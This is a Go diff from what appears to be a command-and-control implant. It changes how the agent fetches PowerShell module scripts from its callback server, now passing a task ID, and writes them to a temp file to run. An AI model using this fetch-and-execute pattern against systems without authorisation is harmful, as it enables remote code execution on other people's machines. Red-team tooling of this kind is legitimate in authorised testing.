@@ -913,9 +913,14 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		fmt.Printf("[DEBUG] PowerShell module detected, fetching script from server\n")
 		{{end}}
 		
-		// Request module script from server
+		// Request module script from server with task ID to get parameters
 		client := &http.Client{Timeout: 30 * time.Second}
-		req, err := http.NewRequest("GET", callbackURL+"/module/"+moduleID, nil)
+		moduleURL := callbackURL + "/module/" + moduleID
+		// Add task ID as query parameter so server can look up task parameters
+		if taskID != "" {
+			moduleURL += "?task_id=" + taskID
+		}
+		req, err := http.NewRequest("GET", moduleURL, nil)
 		if err != nil {
 			sendResult("module", taskID, fmt.Sprintf("Error creating module request: %v", err))
 			return
@@ -953,25 +958,8 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 			return
 		}
 		
-		// Build PowerShell command with parameters
-		scriptWithParams := script
-		if len(params) > 0 {
-			// Add parameters to script
-			var paramParts []string
-			for k, v := range params {
-				if k == "session_id" || k == "Agent" {
-					continue
-				}
-				if v == "True" || v == "False" {
-					paramParts = append(paramParts, fmt.Sprintf("-%s", k))
-				} else {
-					paramParts = append(paramParts, fmt.Sprintf("-%s \"%s\"", k, v))
-				}
-			}
-			if len(paramParts) > 0 {
-				scriptWithParams = script + "\n" + strings.Join(paramParts, " ")
-			}
-		}
+		// Script already includes script_end with parameters substituted server-side
+		// No need to append parameters again - just write the script as-is
 		
 		// Execute PowerShell script
 		// Use temp file approach to avoid command line length limits
@@ -981,7 +969,7 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 		{{end}}
 		
 		// Write script to temp file
-		if err := os.WriteFile(tmpFile, []byte(scriptWithParams), 0644); err != nil {
+		if err := os.WriteFile(tmpFile, []byte(script), 0644); err != nil {
 			sendResult("module", taskID, fmt.Sprintf("Error writing temp file: %v", err))
 			return
 		}
